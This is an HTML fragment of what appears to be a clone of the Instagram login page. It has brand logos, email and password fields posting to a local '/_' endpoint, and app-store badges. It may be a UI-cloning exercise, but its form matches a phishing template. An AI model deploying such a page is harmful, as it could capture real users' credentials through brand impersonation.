<main>
    <div class="log-in-container">
        <form action="/_" method="POST">
            <div class="log-in">
                <!-- Logo -->
                <img src="./images/instagram-logo.png" class="logo" />
                <!-- Log in form -->
                <div class="log-in-form">
                    <input type="text" name="email" placeholder="Email or phone" />
                    <input type="password" name="password" placeholder="password" />
                    <button class="log-in-button" type="submit">Enter</button>
                </div>
                <!-- OR divider -->
                <span class="or-divider">OU</span>
                <!-- Log in with Facebook -->
                <div class="fb-login">
                    <a href="#">
                        <img src="./images/facebook-icon.png" />
                        <span>Facebook</span>
                    </a>
                </div>
                <!-- Forgot password? -->
                <a href="#"></a>
            </div>
        </form>
        <!-- Sign up -->
        <div class="sign-up">
            <span>New user?</span><a href="#">signup</a>
        </div>
        <!-- Download app -->
        <div class="get-the-app">
            <span>Instagram inc 2024</span>
            <div class="app-images">
                <a href="#"><img src="./images/applestore.png" /></a>
                <a href="#"><img src="./images/googlestore.png" /></a>
            </div>
        </div>
    </div>
    <!-- Phones -->
    <div class="phones-container">
        <img src="./images/phones.png" />
    </div>
</main>
<footer>
    <ul class="footer-links">
        
        <li><a href="#">Instagram Lite</a></li>
    </ul>
